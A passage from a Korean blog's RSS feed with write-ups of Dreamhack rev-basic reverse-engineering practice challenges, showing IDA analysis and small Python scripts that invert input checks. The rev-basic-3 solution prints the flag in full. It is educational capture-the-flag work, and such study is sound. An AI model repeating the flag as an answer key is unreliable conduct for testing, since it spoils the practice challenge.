class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;00&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 검증 루프 조건문을 해석해 보자.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;(24&lt;em&gt;*x&lt;/em&gt;)&lt;/td&gt;
      &lt;td&gt;(&lt;em&gt;x&lt;/em&gt;»4) 는 (&lt;em&gt;x&lt;/em&gt;«4)&lt;/td&gt;
      &lt;td&gt;(&lt;em&gt;x&lt;/em&gt;»4) 와 동치된다.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;즉, 검증 루틴의 수식은 아래와 같이 변경 가능하다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(usr_input[i]&amp;lt;&amp;lt;4) | (usr_input[i]&amp;gt;&amp;gt;4) != byte_140003000[i]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;usr_input[i] 가 1byte짜리인 것을 감안하면, 앞뒤 4bit씩을 교환하는 의미를 가지고 있음을 알 수 있다.&lt;/p&gt;

&lt;p&gt;그렇다면 동일하게, 무엇이 알맞은 usr_input[i] 인지를 알고 싶다면&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usr_input[i] = (byte_140003000[i]&amp;lt;&amp;lt;4) | (byte_140003000[i]&amp;gt;&amp;gt;4)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;가 될 것이다.&lt;/p&gt;

&lt;p&gt;이를 프로그램으로 구현해 보자.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# 프로그램 내부에 저장되어 있던 데이터 덤프 파일을 리스트로 저장tmp=[]
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./data&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;rb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byteorder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;big&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#EOF then end the loop        tmp.append((((byte) &amp;lt;&amp;lt; 4)&amp;amp;0xFF)|((byte) &amp;gt;&amp;gt; 4))
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_to_string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그 획득 완료!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_4.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-4/Untitled_4.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-4</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-4</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-3 문제 풀이</title>
        <description>
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_5.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_5.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;64비트 PE&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_6.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_6.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;실행시 사용자 입력값을 받고, 아무렇게나 입력하면 프로그램 종료&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_7.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_7.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;IDA에 넣고 돌려보니 non-stripped&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_8.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_8.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Strings subview에서 Input:이 어디에서 나오는지 확인해 보니 아래와 같음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_9.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_9.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;핵심은 sub_140001000() 같으므로 확인&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_10.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_10.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사용자 입력값과 조건을 대조하는 함수&lt;/p&gt;

&lt;p&gt;byte_140003000 배열에 대해 입력값 하나하나와 조건문을 통과하는데, 조건 통과하지 못할 경우 0 리턴, 조건을 모두 통과하면 1 리턴&lt;/p&gt;

&lt;p&gt;배열의 원소 중 0번째 원소부터 0x18개 즉, 24개만 봄. 즉, 사용자 입력값도 24byte&lt;/p&gt;

&lt;p&gt;byte_140003000 배열은 아래와 같음&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8868&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;A5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;검증 루틴을 방정식 풀이처럼 풀면 아래와 같은 답이 나옴&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 파이썬으로 input 배열, 즉 사용자의 입력값에는 무엇이 들어가야 하는지 계산하는 함수를 작성했음&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;153&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;148&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;159&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;165&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;157&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#사용자 입력값# 검증 루틴 역연산for i in range(0,24):
&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;하지만 저걸로 나온 값을 다짜고짜 주면 문제가 생긴다. 콘솔을 통해 stdin으로부터 값을 받는 행위가 있기 때문에 여기에 단순히 키보드로 숫자를 입력하면 char로 인식되지 int로는 인식되지 않는 게 당연한데, 난 이걸로 삽질했음&lt;/p&gt;

&lt;p&gt;주어진 프로그램 내부를 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001210&lt;/code&gt; 내부에 이런 부분이 보인다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_11.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_11.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_acrt_iob_func(0)&lt;/code&gt; 은 stdin 함수의 핵심이다.&lt;/p&gt;

&lt;p&gt;정확히는, stdin 함수의 정의가 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__acrt_iob_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsinged&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__acrt_iob_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__acrt_iob_func(0)&lt;/code&gt; 은 fd 0인 파일(stdin)의 FILE* 형식의 주소값을 리턴하는 기능을 한다.&lt;/p&gt;

&lt;p&gt;이 점을 감안하고 다시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_140001210&lt;/code&gt; 를 살펴보면 다음과 같은 사실을 알 수 있다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;내부에서 리턴시 콜하는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1400010D0&lt;/code&gt; 은 아래와 같다&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_12.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_12.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;즉, stdin의 입력값을 받아 내부 버퍼에 저장하는 과정이다&lt;/li&gt;
  &lt;li&gt;즉!!!! 내가 입력하는 값은 char로 처리되는 거지 int로 처리되는 게 아님&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;따라서 나는 역산으로 도출한 값을 char로 바꿔보든가, 안 바꿔지면 파이프를 통해 hex를 보내든가 해야 할 것 같음&lt;/p&gt;

&lt;p&gt;그런데 이건 플래그 값 찾는 거니까 아마 웬만하면 문자열일 것&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_13.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_13.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;정답이었다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 플래그는 I_am_X0_xo_Xor_eXcit1ng 인데,&lt;/p&gt;

&lt;p&gt;NULL 문자는 왜 필요한가?&lt;/p&gt;

&lt;p&gt;왜냐하면 C 언어로 쓰인 프로그램에서 문자열 입력을 받으면, 문자열 맨 끝에 자동으로 NULL을 덧붙여 메모리에 저장함으로써 문자열의 끝을 표현하기 때문이다.&lt;/p&gt;

&lt;p&gt;아무튼 문제 풀이 완료!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_14.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-3/Untitled_14.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-3</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-3</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-2 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-확인&quot; id=&quot;markdown-toc-0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-행위-파악&quot; id=&quot;markdown-toc-1-행위-파악&quot;&gt;1. 행위 파악&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000user_input&quot; id=&quot;markdown-toc-21-sub_140001000user_input&quot;&gt;2.1. sub_140001000(user_input)&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-2/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PE64, 아마 패킹은 안됐을 듯&lt;/p&gt;

&lt;p&gt;C 언어로 작성된 프로그램&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

